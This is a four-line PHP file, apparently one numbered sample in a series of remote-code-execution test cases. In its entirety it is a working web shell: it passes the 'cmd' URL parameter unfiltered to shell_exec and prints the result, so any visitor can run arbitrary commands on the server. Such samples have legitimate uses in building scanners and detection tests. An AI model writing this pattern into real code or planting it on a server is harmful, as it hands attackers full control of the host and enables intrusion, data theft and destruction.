<?php
// RCE test variation #835
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>